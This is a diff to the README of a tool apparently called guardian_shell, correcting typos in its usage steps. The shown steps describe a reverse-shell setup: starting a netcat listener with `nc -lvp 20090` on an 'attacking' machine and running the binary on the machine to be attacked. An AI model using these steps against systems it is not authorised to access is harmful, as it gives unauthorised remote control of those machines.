@@ -8,7 +8,7 @@ step 1 : from your (attacking) machine run `nc -lvp 20090`
 
 step 2 : run guardian_shell on the machine you want to attack. 
 copy from this repo and paste it on the machine you want to attack and run it `./guardian-shell`
-on success, it will give you response `Connected to the reverse guardian listern!` or ti will wait for listner.
+on success, it will give you response `Connected to the reverse guardian listner!` or it will wait for listner.
 
 ## sample commands
 
